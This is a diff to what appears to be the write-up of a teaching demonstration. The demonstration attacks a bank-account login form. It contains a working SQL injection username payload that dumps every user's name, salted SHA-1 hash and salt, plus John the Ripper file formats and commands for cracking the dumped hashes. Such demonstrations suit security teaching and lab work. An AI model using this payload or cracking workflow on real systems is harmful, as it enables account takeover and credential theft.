@@ -27,7 +27,7 @@ Demonstration Overview
 In the demonstration, we perform an SQL injection via the login form. We set
 the username to be:
 
-' OR 1=1 UNION SELECT GROUP_CONCAT(Username || ':' || PasswordHash || ':' || Salt, '  ||  ') AS Amount FROM BankAccount WHERE '1' = '1
+' OR 1=1 UNION SELECT GROUP_CONCAT(Username || ' : ' || PasswordHash || ' : ' || Salt, '  ||  ') AS Amount FROM BankAccount WHERE '1' = '1
 
 (The password can be any string.) This allows us to see all of the users' 
 salts and password hashes, which are SHA-1 for this purpose. We then use 
@@ -36,21 +36,21 @@ having its own salt, JTR can crack salted SHA-1 hashes in a single file.
 To do so, create a blank password file, and format each username/salt/hash 
 combination on each line (without the brackets):
 
-[username]:$dynamic_24$[hash]$[salt]
+[username]:$SHA1p$[salt]$[hash]
 
 For example:
 
-admin:$dynamic_24$d97e0269f76f350d85c09244cffd41439fe90a99$*Utf&+s5
+admin:$SHA1p$*Utf&+s5$317fe16a5f409e871b21c3460a75dab8dc906767
 
 Then, run JTR to recover some of the passwords. In the MacOS version of John 1.7.9-jumbo-7 (see http://openwall.info/wiki/john/custom-builds#Compiled-for-Mac-OS-X):
 
-./john --incremental [password file]
+./john --format=sha1-gen [password file]
 
 ./john --show [password file] 
 
 and in the Windows version of John 1.7.9-jumbo-7-Win-32:
 
-john --incremental [password file]
+john --format=sha1-gen [password file]
 
 john --show [password file] 
 
